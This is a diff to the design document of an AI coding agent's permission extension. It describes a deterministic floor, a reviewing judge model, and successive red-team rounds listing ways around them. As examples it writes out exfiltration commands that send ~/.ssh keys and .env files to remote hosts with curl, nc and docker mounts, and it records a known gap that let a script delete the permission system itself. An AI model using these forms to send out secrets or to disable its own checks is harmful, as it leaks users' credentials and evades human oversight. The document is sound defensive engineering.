@@ -695,6 +695,93 @@ When several paths are requested together, the strictest mode wins.
   agent can't write it.
 - When the judge asks the user, its reason is shown in the dialog.
 
+#### 7.3.0 The floor and the defaults, as built (final pass, 2026-11-24)
+
+This is the current description; §7.3.1–§7.3.17 below are the history of how each part came to be (the rounds, the
+red teams, the cases that showed each gap). Where they differ, this section holds.
+
+**One pipeline.** Every way a request can be allowed (core.ts `ENTRY_POINTS`: a file tool's default allow, a grant, a
+rule, `request_permission`, an MCP or extension tool, a rule-allowed or sandboxed bash line, an escalation) calls
+`Permissions.gate` first: the owner's denials and the floor's `before` rows. A request the floor holds is put to the
+owner with no judge; everything else is the reviewing model's call, with the code's findings in its prompt as
+evidence. Nothing to match (no denial, no other chat's ledger, no secret, no permission-system path) costs nothing.
+
+**The floor** (floor.ts `FLOOR`, the only deterministic asks):
+
+| row | asks when | read by |
+|---|---|---|
+| `secret-off-machine` | a secret or credential would leave this machine | sources × sinks below |
+| `permission-system` | a change to the permission system itself (§3.6) | every path through one resolver |
+| `owner-rule` | the owner's own rule says ask/deny | command rules, request kinds |
+| `owner-denied` | the owner clicked Deny on the same effect over the same, a containing or a contained target, and no own word of theirs since asks for it | denials.ts |
+| `other-task` | the line destroys, or writes into, another task's entity or working tree, and the owner's words don't name it | `otherTaskOf`, task ids |
+| `no-judge` | no reviewing model could decide | after the review |
+
+**Secrets: sources.** A sensitive file — by name (config.ts `DEFAULT_SENSITIVE` and the owner's patterns) or, where
+the file exists, by content (defaults.ts `secretByContent`: private keys, cloud and forge tokens, credential-named
+`KEY=value` lines, and a file that is one base64/hex blob of those); a command whose output is a stored or minted
+credential (risk.ts `SECRET_SOURCES`, also when inline code spawns it); a variable named like a credential, or one
+whose name is known only when it runs.
+
+**Secrets: sinks, closed by their default.** A secret's *contents* given to any program not known to keep them on
+this machine (defaults.ts `LOCAL_CONSUMERS`: readers, filters, encoders, archivers, editors, the clipboard, shell
+builtins) — on its input, through a pipe, in an argument a substitution built — may leave: row 1. A secret *file*
+given to a program that names another machine (`namedRemote`: a host option, a URL, `//host/`, `host:path`) is sent;
+so is one written into a place that leaves the machine by itself (`OFF_MACHINE_PLACES`: iCloud Drive, sync clients'
+folders, mounted volumes), and one a container is told to use under a bind mount while it is told to reach another
+machine. The sink tables (risk.ts `NETWORK_SINKS`, code.ts network categories) stay for their programs' own forms
+(`@file`, `-T`, `--data-binary`, sockets, DNS). Not a send: a tool's own credential option (`OWN_CREDENTIAL`,
+`KEY_OPTIONS`: `--password-stdin`, `ssh -i`, `--kubeconfig`, `--env-file`), a download's destination (output
+options, bundled short flags ending in `o`), a command that runs on another machine (`runsElsewhere`), a token sent
+only to the service that issued it (`CREDENTIAL_ISSUERS`). The owner's consent never lifts row 1.
+
+**Reading a line.** shell.ts reads every command a line can run (pipes, lists, substitutions, functions, aliases,
+loops over literals, heredoc scripts, `eval`, `trap` text, assignment prefixes, ANSI-C quoting, parameter transforms,
+`$HOME`/`~NAME`/`$USER` and the user's home folder by name, `$(cd …; pwd)`, `git rev-parse --show-toplevel`). fold.ts
+computes printers and pure transforms of literals (`printf`, `echo`, `base64 -d`, `xxd -r`, `rev`, `tr`, one plain
+`sed s///`, `jq -rn`). resolve.ts is the one path resolver (braces, globs and their current matches, `..`, links
+followed, the data-volume firmlink). Any program not known to be plain (defaults.ts `PLAIN_PROGRAMS`) that is given
+words or text starting a command (`COMMAND_STARTS`), or an option that runs its value, is read as running them — one
+reading for the floor and the denials. Inline code (code.ts) is scanned for paths (literal pieces folded first),
+home forms, network categories, file operations and spawned commands. Project scripts (scripts.ts `SCRIPT_RUNNERS`:
+shell files, make, package scripts and install lifecycle, just, deno task, go-task, pre-commit) are read as lines of
+their own, never remembered; another's non-shell scripts and committed project shell scripts stay the judge's.
+
+**Other tasks.** Each chat's ledger records what it made (catalogue.ts creators); entries carry the engine's task id
+(`CYPHER_TASK_ID`: `workspace:<bot>`, `workspace:<bot>/plan:<work>`, `chat:<id>`, a subagent its root's). Same task:
+never held. Another known task: the floor. Unknown lineage: the floor outside this chat's working tree, the judge
+(with "another chat made it") inside it for kinds with a place. What counts: any destroying effect by the program
+tables and flow.ts group destroyers (deletes, stops, moves, `rsync --delete` destinations, `DROP`, patch deletes,
+selector and `--all` deletes, `kill-server`), operands known only at run time matched by their producers' tests, globs
+by what they could match, and writes or destroys inside another task's working tree outside this chat's own trees.
+
+**Denials.** A Deny records units (effect × typed target, schema.ts and effects.ts); a later request meets it when
+its units meet — another tool, an API route, a script, a build that pushes, a narrower or broader target. Only the
+owner's own words lift it, naming the target and the effect, not as a question, negation, retraction or condition,
+and not words they quote from someone else or forward (explicit.ts `ownSpeech`, `LIFT_CONDITION`). A dismissed
+prompt is no denial.
+
+**The owner's naming.** The owner's own speech (explicit.ts `ownText`, `ownSpeech`: no fenced or quoted text, no
+forwarded message) names what they ask; a negation, an exception ("except X"), a keeping verb ("leave X alone") or a
+condition names nothing to act on.
+
+**What goes to the judge, marked, never approved by default or remembered:** a path or command known only when it
+runs ("could be the permission system / a secret"), opaque or unreadable code, a secret path given to a program that
+names no machine, unknown origin of cluster and cloud resources, another chat's entity inside this working tree with
+unknown lineage, a line the reader can't follow. An approval of a line not read in full runs once (no pattern kept).
+
+**Lists still open** (each needs a format or a fact the code doesn't have): which printers and transforms fold
+(a word the folder can't compute keeps the judge's reading, since owner-approved lines write to computed paths);
+which manifests run code; `~+`, `~-`, `dirs`, `CDPATH`; SQL entities and services (`launchctl`); copies derived
+through encryption or compression; programs that send by their configuration (`lp`, ansible inventories).
+
+**Known gap found by the final test (blind-7, not fixed: the extension was frozen for it).** A project script is read
+for one finding: core.ts `scriptFinding` keeps the first danger `scanFinding` reports in the script's text, so a
+permission-system change on a later line (`docker compose down -v` then `rm -rf ~/.cypher/pi-runtime/agent/cypher-
+permissions`, b7-076) reaches the judge as "deletes container volumes" instead of the floor. The same script without
+the earlier danger floors. The fix is to keep a floor finding over a worse-but-judged one inside one text; the live
+judge asked on b7-076 in the final run, round 6's extension approved it.
+
 #### 7.3.10 Round 3: the judge decides, the code's checks are evidence (2026-11-23)
 
 The owner's instruction is quoted in §7.3.1. Their standing rule holds too: mechanisms and
@@ -939,6 +1026,8 @@ consent); each is a mechanism, re-checked on a second blind set the fix pass nev
   retraction: `retracts`, `forbids`).
 
 #### 7.3.1 The floor: the only deterministic asks (rewritten in round 3, 2026-11-23)
+
+(History: the current description of the floor is §7.3.0.)
 
 The owner (round 3): *"除了非常危险的，必须弹窗用户允许，其他的都可以走模型判断。尤其是用户的上一轮对话已经要求做的事情，审核模型一定要放行。绝对不要再弹窗。"*
 (except for the truly dangerous, which must prompt the owner, everything may go to the
@@ -1663,6 +1752,305 @@ words (typed, plan, card or answer; not a reply) name it, and when they do the j
 with the line "- not this task's: … (the owner's words name it: …)" in its evidence (concern
 `other-task`).
 
+#### 7.3.12 Round 6: one pipeline, typed targets by declaration (2026-11-24)
+
+Five mechanisms (tests: `cypher-permissions-round6.test.mjs`), none fitted to the blind-5 lines:
+
+- **One decision pipeline (W1).** Every way a request can be allowed is listed in core.ts
+  `ENTRY_POINTS` (a file tool's default allow, a grant, a rule; `request_permission` for paths
+  already allowed; an MCP/extension tool allowed by its setting or an approval; a bash line a rule
+  or an inspection runs outside the sandbox; a sandboxed bash line; an escalation), and each calls
+  `Permissions.gate` before it allows: the owner's denials (denials.ts) and the floor's `before`
+  rows. Held, a file or tool request goes to `elevate` (the floor asks the owner, no judge), a
+  rule-allowed line to review, a sandboxed line is refused with "run it with `escalate`". Nothing
+  to match (no denial in the chat, nothing destroyed, no other chat's ledger) costs no prompt and
+  no judge call. The file tools and their access are `FILE_TOOL_ACCESS`; the test drives every
+  entry point from these lists.
+- **Typed targets by declaration (W2).** schema.ts `TARGET_SCHEMAS`: per tool (kubectl/oc, helm,
+  docker/podman, gh, glab, curl/http/xh, aws, gcloud/gsutil) which option or operand names which
+  entity kind, with a role — `target`, `within` (a namespace or repository: where named operands
+  are, and the target itself when none is named, `delete all --all -n X`), `env` (context,
+  cluster, profile: never a target). `API_ROUTES`: method × route (GitHub `repos/…`, GitLab
+  `projects/…`) → effect class and entities (`PUT …/pulls/N/merge` merges pr N, `DELETE
+  …/git/refs/heads/X` changes branch X). effects.ts `commandEffects` reads them, so denials and
+  the other-task floor match by typed target. New entity kinds: namespace, context, cluster,
+  bucket, project. Safety net, for denial matching only (`tokenMatch`): an argv word equal to a
+  denied target's name touches it when the effects meet (an unknown effect — a program no table
+  reads, an MCP tool — meets any).
+- **Provenance of every kind (W3).** Ledger kinds are read through `KIND_ALIASES` (dir, folder,
+  file → path; ns → namespace); entries carry the chat's task (`CYPHER_TASK_ID`: a workspace and
+  its threads, a plan and its sessions), and one task's chats are never each other's other task.
+  `otherTaskOf`: any destroying effect (delete, erase, stop, move away — by the program tables,
+  `DenialUnit.destroys`; a content write is none) on another chat's entity — the same, one inside
+  the target, or one the line's globs could match — is the `other-task` floor, for every line, not
+  only dangers, unless the owner's words name it. Narrowed (2026-11-24): while the lineage is
+  unknown (no task id on this chat or on the other chat's entry, or only owner chats' lineages;
+  ledger.ts `taskRelation`, §7.3.13), a kind the floor first held in round 6 that has a place (ledger.ts
+  `OTHER_TASK_FLOOR`: `path`) destroyed inside this chat's own working tree (its cwd's git worktree)
+  is held for the judge's review with "another chat made it" as evidence, not the floor, so a plan's
+  parallel sessions in one worktree don't put each other's scratch to the owner; outside the tree,
+  with differing task ids, and for the kinds held before (branches, PRs, worktrees, …) the floor stays.
+- **Code as categories (W4).** A secret given to any command is read by it whatever the flag
+  (`-i`, `--input=`, `-in`, positional, `@`, `<`), except a program's own key options (risk.ts
+  `KEY_OPTIONS`: `ssh -i`, `curl --cert`, …) and stat-only programs. code.ts `HOME_FORMS`: the home
+  folder in any syntax (`$HOME`, `${HOME}`, `$ENV{HOME}`, `%USERPROFILE%`, `ENV['HOME']`,
+  `os.environ['HOME']`, `process.env.HOME`, `os.homedir()`, `Path.home()`, `Dir.home`, …), at a
+  literal's start or joined to one. `NETWORK_CATEGORIES`: raw sockets, socket devices, HTTP
+  clients, DNS lookups, host:port literals of another machine, beside the library names.
+- **Runtime write targets by their possible set (W5).** risk.ts `runtimeWriteSets`: a consumer
+  that writes what a pipe hands it (`xargs -I{} sh -c '… >> {}'`, `xargs tee -a`, `xargs sed -i`)
+  writes only what the producer could print; when that is a listing (`LISTERS`: ls, echo, find
+  with its `-name`/`-path` tests, …) seen through `SUBSET_FILTERS` (head, sort, grep, …), the
+  floor's `permission-system` row applies if the set could hold the permission system. Any other
+  producer leaves the set unknown and nothing asks more than before.
+
+#### 7.3.13 Final pass: task ids from the engine, and the remaining floor gaps by class (2026-11-24)
+
+Tests: `cypher-permissions-final.test.mjs` (random names, three seeds), `crates/engine/src/session/engine/task_id.rs`,
+`crates/harness/tests/pi.rs` `the_task_id_reaches_the_permission_extension`.
+
+**Task ids (`CYPHER_TASK_ID`).** The engine's `host_context` fills `RunHostContext.task_id` and the harness sets it
+beside `CYPHER_CHAT_ID` (cleared first on every spawn). The id is a lineage, widest first:
+
+| chat | `CYPHER_TASK_ID` |
+| --- | --- |
+| a workspace's own chat, its routines' and peers' threads, a project routine's session | `workspace:<bot>` |
+| a session a plan started (`Chat.started_by.work_id`, else the plan record's steps), the plan's background thread (`BotThread::Work`) | `workspace:<bot>/plan:<work>` |
+| an owner's plain chat | `chat:<id>` |
+| a subagent's child chat (any depth) | its root chat's id |
+| a memory pass, a child whose parent row is gone, discovery | none |
+
+ledger.ts `taskRelation` reads two ids: **same** when equal or one is the other's prefix by whole `/` segments (a
+plan's sessions with each other and with their workspace's chat; a subagent with its parent), **other** when both are
+`workspace:` ids and neither contains the other (two plans, two workspaces), and **unknown** otherwise: an id is
+missing (an entry an older Runtime wrote), or either is only a chat's lineage (`chat:`; the owner may split one piece
+of work over two plain chats by hand, so two plain chats are no *known* other task). Same: the other-task floor never
+holds it. Other: the floor, inside this chat's working tree too. Unknown: the round-6 narrowing (inside the working
+tree, a `since: 6` located kind is the judge's with the evidence; outside, the floor). So a plan's parallel sessions
+in one worktree are one task and pass, two plans destroying each other's work floor, and owner chats keep today's
+behaviour.
+
+**Gaps closed by class** (each a mechanism or a table, none a case):
+
+- *Commands whose output is secret material* (risk.ts `SECRET_SOURCES`, new rows and a `with` option): private-key
+  exports (`gpg --export-secret-keys`, `gpgsm`), stored secrets and minted tokens (`kubectl config view --raw`,
+  `kubectl get secret`, `aws ecr get-login-password`, `secretsmanager`, `ssm --with-decryption`, `gcloud secrets
+  versions access`, `az keyvault secret show`, `gh auth status --show-token`, `sops -d`, password managers). They are
+  sources for any sink in the line (the data-flow floor).
+- *The home folder by evaluating the user's name* (shell.ts): `$(eval WORDS)` reads its words again (`$(eval echo
+  ~$(whoami))`), `~NAME` of the user the line runs as is the home folder (a word's start, an assignment's value),
+  `~$(…)` stays a literal `~` as bash keeps it,
+  and fold.ts `USER_PRINTERS` (`whoami`, `logname`, `id -un`) print the user's name.
+- *Parameter transforms of known values* (shell.ts `PARAMETER_TRANSFORMS`): `${V/#pat/rep}`, `/`, `//`, `/%`, `#`,
+  `##`, `%`, `%%`, `^^`, `,,`, `${V:off:len}` are computed when the value and operands are known (a base64-decoded path
+  rewritten by `${D/#\~/$HOME}` is the permission system's file); otherwise unknown as before.
+- *A feeder's write target built around its operand* (risk.ts `feederWriteTemplates`): `xargs -I{}`/`parallel`
+  running an inline shell or a writer whose target holds the token (`> ~/.cypher/…/agent/{}`) writes that template's
+  glob; the floor's permission-system row meets it.
+- *An environment variable for an option* (schema.ts `ENV_OPTIONS`, `withEnvOptions`): `GH_REPO`, `KUBECONFIG`,
+  `AWS_PROFILE`/`AWS_REGION`, `CLOUDSDK_CORE_PROJECT`, `DOCKER_HOST`, `GIT_DIR`, … in front of the command are the
+  options they stand for, for typed targets and the argv safety net. The safety net also reads a denied line that
+  names no typed target by its own words: asked again by the same program with every word it gave (options and
+  their values too), it is the same request (`GH_REPO=o/r gh issue close 301 -c dup` after a denied `gh issue close
+  301 --repo o/r`; a plain `down` after a denied `down -v` gives fewer words and is not).
+- *A project's resources destroyed as a group* (flow.ts `GROUP_DESTROYERS`): `docker compose down` (containers;
+  `-v` its volumes, `--rmi` its images), `compose rm -v`, `kubectl delete -f/-k`, `terraform destroy`, as a runtime
+  operand of the kinds with the compose project's name test (`-p`, else the compose file's folder, else the cwd);
+  denials and the other-task floor meet it.
+- *A push of an empty source deletes its destination* (flow.ts `RUNTIME_OPERANDS` `word` rows): `git push origin
+  :refs/tags/{}` under a feeder is a runtime tag (`refs/heads/` a branch, bare both).
+- *What a process is known by* (core.ts `entityForms`, `processDescription`; flow.ts `passes(…, also)`): another
+  chat's process meets a name test by the command that started it (the ledger's `by`) and its live command line and
+  listening ports (`ps`, `lsof`), so `kill $(pgrep -f 'cargo watch')` and `kill $(lsof -t -i :PORT)` reach it. A gone
+  process has no description and meets nothing.
+- *Project scripts* (scripts.ts `SCRIPT_RUNNERS`): `bash|sh FILE`, a path with a shell shebang, `make TARGET`
+  (prerequisites' recipes, `-C`, `-f`), `npm|pnpm|yarn|bun run X` (with pre/post), `just X` do what their lines do:
+  each line is read as a line of its own (two levels deep) and its units join the request's, so denials and the
+  other-task floor see through the opaque command. A script that can't be read stays opaque, as before.
+- *Patch operations* (core.ts `patchOps`, `AccessRequest.op`): an apply_patch `*** Delete File:` destroys its file,
+  an `*** Update File:` with `*** Move to:` moves its source away; the other-task floor and denials of a delete meet
+  them. A judge approval of a request held for review runs once and keeps no grant (as the bash path).
+- *Content writes into another task's working tree* (core.ts `otherTaskOf`, `inOwnTrees`): a write or edit (file
+  tools, a bash write by escalation, an MCP tool that writes) of a file inside a worktree another chat made, or a folder
+  of its that is a git checkout, outside this chat's own working tree and the folders added to it, is the other-task
+  floor. Decision: the floor's row is "another task's resources", and a working tree mid-change is that task's work in
+  progress — overwriting a file there is as destructive to it as a delete (the owner's own rule: never touch other
+  sessions' uncommitted files). It is narrow by construction: a chat working inside that tree (its cwd), the same task
+  (plan siblings, their workspace), a plain folder another chat made, and the owner's words naming the tree all pass.
+- *Unknown origin as evidence* (core.ts `originUnknown`, judge.ts): what a line deletes or stops of a cluster or cloud
+  kind (ledger.ts `OTHER_TASK_FLOOR` since 6 without a place: namespace, context, cluster, bucket, project, typed by
+  the line's schema) that neither this chat's ledger nor any other chat's names reaches the judge marked "who made it:
+  unknown … isn't shown to be this task's: approve only when the owner's words or the conversation account for this
+  one". This is where a resource known only by absence (another chat's namespace made before ledgers, or by hand)
+  ends: the code can't decide it, and it is not approved by default.
+
+#### 7.3.14 Final pass, iteration 1: the red-team f1 classes (2026-11-24)
+
+Tests: `cypher-permissions-final-it1.test.mjs` (10, three seeds). Each class as a mechanism or a table:
+
+- *Text another program hands a shell* (shell.ts `INLINE_SCRIPTS`): `eval WORDS` at the top level, `watch [opts] CMD`
+  (not `-x`), `env -S 'CMD'` are read as their script, as `bash -c` is; `eval` whose script was read is inert itself.
+  In `assessOpaque` the permission-system check now comes before the installed-app check (a floor finding first).
+- *Deletes in code* (code.ts `DELETE_NAMES`): one table of delete calls per language, read both as writes (the
+  permission-system floor for code) and as destroys (`CODE_DELETES`); capability names match as member calls
+  (`fs.rmSync`, `shutil.rmtree`). A concatenated home path ends where the call's argument does (`homeJoined`: the
+  comma continues only a join's own arguments).
+- *Inline code's own effects* (core.ts `lineClass`, code.ts `SIGNAL_CALLS`): the commands it spawns are read as lines
+  of their own for denials and the other-task floor, and a literal pid it signals (`process.kill`, `os.kill`,
+  `Process.kill`, perl `kill`) is a stop of that process.
+- *Project scripts are the line's own* (core.ts `scriptFinding`): the lines of a script, make recipe, package script
+  or justfile recipe the line runs are read as shell lines for the floor too (a secret sent by `make deploy` is row 1),
+  the judge sees them ("project script: `make deploy` runs: …"), and an approval of such a line is never remembered
+  (the script may change). A script the same line writes first is read from what it wrote. The system's own scripts
+  (a file in a system location, `commands.ts` `systemLocation`: outside home, not writable) are programs, not read.
+- *Code set up to run later* (scripts.ts `HOOK_TRIGGERS`, `scheduledLines`, `UNREAD_FORMS`): a git hook the line (or
+  this task) wrote is read as what the git command that triggers it runs; crontab entries the line gives are read as
+  their commands. What can't be read — a crontab file, a launch agent, a systemd user unit, a hook written elsewhere,
+  a sourced file's variables where the line uses a word known only when it runs — reaches the judge marked "Cypher
+  couldn't read: …" (a fact, with no instruction to ask), and its approval runs once.
+- *A function's arguments* (shell.ts `call`): a call's words are its body's `$1`…`$9`, and `$@`/`$*` when the call
+  gave one word (several would be several words; they stay unknown).
+- *Path printers* (fold.ts `PATH_PRINTERS`): `realpath X`, `readlink -f X`, `basename`, `dirname` fold to the path, so
+  `$(realpath ~/.ssh/id)` is that file for row 1. *Directory moves* (core.ts `directoryMove`): `pushd DIR` (onto a
+  stack), `popd`, `cd -P/-L DIR` move the shell like `cd`.
+- *Bulk staging* (core.ts `bulkStagedSecret`): `git add .`/`-A`/a folder/`commit -a` followed by a push sends what git
+  would add: an untracked secret no ignore rule hides under the pathspecs, or any secret in the tree when the same
+  line first edits `.gitignore`/`info/exclude`/`core.excludesFile`.
+- *Denials across forms*: a denied destroy covers stopping the same entity (denials.ts `EFFECT_PARTS`; records keep
+  `destroys`); a publish with no operand publishes the folder's package, by its manifest's name (schema.ts
+  `FOLDER_PUBLISHERS`: npm/pnpm/yarn/bun, cargo, poetry, flit, hatch); `terraform apply -destroy` is the group destroy
+  of its configuration root (flow.ts `GROUP_DESTROYERS` `group: "root"`); a release addressed by its tag is that
+  release (`API_ROUTES`).
+- *Naming another chat's work to keep it* (core.ts `ownerNames`): the owner's words name it only in a clause that
+  doesn't negate, defer or ask about it ("clean up, but don't touch feat/x yet" keeps the floor).
+
+#### 7.3.15 Final pass, iteration 2: the red-team f2 families (2026-11-24)
+
+Tests: `cypher-permissions-final-it2.test.mjs` (9, three seeds). Each family judged against the floor first:
+
+- *A program hidden by an assignment* (`GIT_TRACE=1 curl …`, `KUBECONFIG=… kubectl delete …`): the floor's readers
+  read the line with the program shown (core.ts `LineAssessment.shown`); the tier and the judge's reading keep the
+  hidden program, since the variable may change how it runs.
+- *Sinks* (risk.ts `NETWORK_SINKS` relay, tailnet, cluster): row 1 only when a secret flows in. A URL built from a
+  secret sends it whatever program fetches it (`urlCarriedSecret`). Publishing a folder (`FOLDER_PUBLISHERS`, an
+  image built and pushed) sends what its ignore rules let through (git's listing with `.npmignore`/`.gitignore`/
+  `.dockerignore`): a secret among it is row 1; publishing ordinary code is not the floor (the judge's
+  "publishes a package"). Serving a folder to the network (`http.server --bind 0.0.0.0` in `~/.ssh`) exposes but
+  sends nothing: the judge's.
+- *Credential stores* (config.ts `DEFAULT_SENSITIVE`): tools' own token files and project `.envrc`, `.dev.vars`,
+  service-account keys; `*.tfvars` stays the judge's (as often plain settings).
+- *App automation*: JXA `doShellScript`, and apps that send (Mail, Messages, Outlook) as a network category.
+- *The permission system's folders* (risk.ts `intoFolder`): a destination folder with the source's name there, a
+  tree synced into a folder of it, git writing a work tree there; the enforcing extension's own files and the
+  installed Runtime's copies; the `/System/Volumes/Data` spelling (resolve.ts); a link the line makes and then
+  writes through (core.ts `throughLinks`).
+- `PI_CODING_AGENT_DIR` (a child agent with another agent folder): not the floor. Owner-approved dev work runs Pi
+  with private agent folders routinely (55 lines in the guard sets); it stays the judge's ("runs a program known
+  only when it runs").
+- *Deferred payloads*: `at`/`batch` input, a crontab fed by a group (the reader sets the group's pipe), a launch
+  agent's `ProgramArguments` when `launchctl load` runs it.
+- *Folders through moves*: a `cd` on an `&&` chain that is the rest of the line, `cd -`; a relative write where
+  the folder is unknown after a move into a folder of the permission system (`movedIntoSystem`).
+- *Feeders*: `xargs -a FILE` reads FILE; a secret's lines handed to a sink; a here-string's names; a while-read
+  loop's variable inside a longer path; a glob as a sink's input (`nc h 9 < .en?`); the `script` wrapper. Shell
+  forms the reader gives up on (`set --`, arrays, an alias ending in `<`) stay opaque: the judge's, marked as a
+  line rules can't read or a path known only when it runs.
+- *Non-shell project scripts* (`python3 tools/upload.py`): round 5's rule stands — only a script this task wrote
+  is read as code; another's is the project's. Shell project scripts (§7.3.14) are read for the floor unless git
+  tracks them (committed code is its owners').
+- *Denials across forms*: scaling to zero is a stop; a denied pid meets a pattern by what the process is known by.
+- *Other tasks' work*: git verbs that discard a tree's work (`gitDiscards`), on a tree not this chat's own; a glob
+  matching inside another task's worktree; `for-each-ref` prefixes; tmux/screen/zellij sessions and the Docker
+  Engine API (schema.ts); a schema tool's deleting subcommand destroys.
+- *Owner naming*: quoted speech (several words in quotes) and sentences with a condition or deferral word don't name
+  another chat's work.
+
+#### 7.3.16 Final pass, iteration 3: lists closed by their default (2026-11-24)
+
+Three red teams in a row found new members of the same open lists (senders, wrappers, credential names, printers,
+script runners). Each list is now read from its finite other side (defaults.ts); tests `cypher-permissions-final-it3.test.mjs`.
+
+- **Senders, closed by default** (core.ts `defaultSink`). A secret's *contents* handed to a program not in
+  `LOCAL_CONSUMERS` (readers, filters, encoders, archivers, editors, the clipboard, the shell's builtins) — on its input,
+  through a pipe, or in an argument a substitution built — may leave the machine: row 1. A secret *file* given to a
+  program that names another machine (`namedRemote`: a host option, a URL, `//host/`, `host:path`) is sent. Narrowed for
+  the cap: not into the tool's own credential option (`OWN_CREDENTIAL`, risk.ts `KEY_OPTIONS`: `--password-stdin`,
+  `-i KEY`, `--kubeconfig`, `--env-file`), not the environment printers (`ps eww` checks on this machine), not a download's
+  destination, not a command that runs on another machine (`runsElsewhere`). A file path handed to an unknown program
+  that names no other machine stays the judge's (`docker run --env-file .env`, `lp`, `ansible` with an inventory): row 1
+  can't tell a tool using its configuration from one sending it. The sink tables stay for their programs' own forms.
+- **Wrappers, closed by default** (core.ts `operandLines`). Any program not in `PLAIN_PROGRAMS` (printers, searchers,
+  git, gh, database clients, interpreters — read by their own readers) and not running elsewhere, given words that start
+  a command (`COMMAND_STARTS`) or an operand whose text is one, may run them; so may an option that runs its value
+  (`--pre`, `-x`, `--exec`, `-c`), a `trap`, an assignment whose value is a command line (`GIT_SSH_COMMAND`, `LESSOPEN`,
+  `GIT_EDITOR`), a line read into a variable the line then runs, and a package runner's package. These lines are read for
+  the floor and give units to the denials and the other-task floor (one reading for both).
+- **Secret names, closed by content** (defaults.ts `secretByContent`): a file that holds a private key, a cloud or forge
+  token, or credential-named `KEY=value` lines is a secret whatever its name, where row 1 reads files. The name list
+  (config.ts `DEFAULT_SENSITIVE`) stays for files that aren't there yet and for the sandbox's own read policy.
+- **Printers and folds**: still a list (shell.ts, fold.ts), now with the shell's own ANSI-C quoting, `printf %b`, `jq -rn`,
+  `$(cd; pwd)`, a substitution's own command after its nested ones, code whose whole output is home, `git rev-parse
+  --show-toplevel`. A word the folder can't compute keeps the round-5 reading: a write whose start is unknown is the
+  judge's ("could be the permission system" evidence), since owner-approved lines write to `$T/x` routinely; an exact
+  place it did compute is that path.
+- **Script runners**: a list of manifests and their tools (scripts.ts: make, package managers' scripts and install
+  lifecycle, just, deno task, go-task, pre-commit), since a manifest's format must be read to know what runs.
+- **Never remembered when unread**: an approval of a line with a word, redirection or path known only when it runs,
+  opaque code or unread parts runs once.
+- Also: `request_permission` meets the gate whether its paths elevate or not; links made by bind mounts and by inline
+  code's symlink calls are followed; a name after an exception word in the owner's words is kept; a fence in their words
+  runs to its closing fence; `update-ref -d`, `fuser -k`, selector and `kill-server` group deletes.
+
+#### 7.3.17 Final pass, iteration 4: the last red team (2026-11-24)
+
+Red team f4 (frozen at d1963684) found 23 pass-throughs in 13 families and 3 over-blocks of the iteration-3 defaults.
+Each is fixed in its mechanism; tests `cypher-permissions-final-it4.test.mjs` (E1–E5).
+
+- **Over-blocks first.** A bundled short-option group ending in the output flag (`curl -sSLo certs/ca.pem URL`) gives
+  the file to that flag: a download's destination, not a secret sent by name. A stored credential printed for a sink
+  that reaches only the service that issued it (risk.ts `CREDENTIAL_ISSUERS`: gh → github.com, glab → gitlab.com,
+  gcloud, az, aws, npm, heroku; every URL of the sink must be one of its hosts) is the tool's own credential at work —
+  the judge's. Any other host in the line, or a look-alike (`api.github.com.evil.io`), keeps row 1.
+- **Names a line builds.** A sink's file argument as a glob (`@.[e]nv`) is checked against the files it matches now, by
+  name and content. Inline code's literal pieces are folded before scanning (code.ts `foldLiterals`: `'a'+'b'`,
+  `['a','b'].join('')`, `String.fromCharCode(…)`, `chr(n)`, Python's adjacent literals). `$USER` and `$LOGNAME` are the
+  home folder's name, and `/Users/NAME/…` and `/home/NAME/…` are the home folder (resolve.ts `byUserName`, after the
+  data-volume firmlink). `sed` given one `s///` substitution with a plain pattern folds (fold.ts).
+- **One secret-source reading.** Names a listing of a secret folder hands to a template (`find ~/.ssh … | xargs -I{}
+  curl -F f=@{}`) are read by the listing's place, as the run-time write sets read them. A command run from inside code
+  that prints a stored credential (`subprocess.check_output(['gh','auth','token'])`) is a `SECRET_SOURCES` row for the
+  code's own sink, as on a shell line.
+- **Sinks by place and by what a client is told.** A container told to reach another machine and to use a file under
+  a bind mount of this machine (`docker run -v ~/.ssh:/k IMAGE … -F f=@/k/id_ed25519 https://…`) sends that file;
+  a tool's own credential option and a mount the container isn't told to use stay out. A secret copied or written into
+  a place that leaves the machine by itself (defaults.ts `OFF_MACHINE_PLACES`: iCloud Drive, `~/Library/CloudStorage`,
+  Dropbox and other sync folders, volumes under `/Volumes`, `/mnt`, `/media`) is sent, whatever program writes it. A
+  database client's last operand after a URL is its input, not a download destination, and its SQL text is split with
+  quotes and SQL punctuation off (`\copy … from '.env'`, `LOAD DATA LOCAL INFILE '.env'`, `psql URL -f .env`).
+- **Derived copies.** A file that is one base64 or hex blob is read as what it decodes to (`secretByContent`), so a copy
+  derived in an earlier step and sent later is the secret it holds. Copies through other transforms (encryption,
+  compression) stay the judge's: nothing records that a file came from a secret.
+- **Destinations read as writes.** rsync's local destination is a change of its own (`--delete` destroys there); a SQL
+  client's database file is changed by a statement that changes data (`DROP`/`DELETE` destroy). A destroy inside another
+  task's working tree, outside this chat's own trees, meets the other-task floor as a write into it does (b6-178).
+- **Publishing through a build.** `docker|podman build|buildx build|buildx bake --push` (or a registry output) and
+  `compose push` are pushes of the images they tag, so a denied `docker push X` is not redone that way.
+- **Owner words.** The owner's own speech is their text without what they quote: fences and quoted lines, inline
+  quoted speech of several words, and a forwarded or pasted message from its header on (explicit.ts `ownSpeech`). A
+  Deny is not lifted by speech the owner attributes to someone (`you said "…"`) or forwarded text, nor by a condition
+  ("if the tests pass, force-push main", `LIFT_CONDITION`: a conditional opening a clause asks for later, which a
+  deferral already sends to the judge); a quoted command the owner asks to run (`ok, run "git push --force origin
+  main"`) still lifts. Keeping verbs ("leave X alone",
+  keep, spare, preserve, 保留, 别动) don't name X to act on.
+- **Harness**: the replay gives the extension the chat's transcript (as production does from `sessionManager`), and
+  blind.mjs has a `wroteFiles` form for a file this chat wrote with the write tool, so scripts a chat wrote and then ran
+  are measured.
+
+Still open after the last iteration, marked for the judge: a secret path given to an unknown program that names no
+machine (`lp`, ansible inventories); `~+`, `~-`, `dirs`, `CDPATH`; opaque code (`bytes.fromhex`, perl `q()`); SQL on
+stdin; `launchctl` services; a `sed`/`tr` the folder can't compute; a line the reader can't follow (`git -c
+core.sshCommand` with nested `"$@"`); copies derived through transforms other than base64 and hex.
+
 ### 7.4 Human approval
 
 `ctx.ui.select`, which Cypher bridges to a question in the desktop and iOS apps
@@ -1890,7 +2278,13 @@ Commands:
 | `cypher-permissions/created.ts` | What this task made, read from the commands it ran: the facts a danger over its own leavings rests on (§7.3.3) |
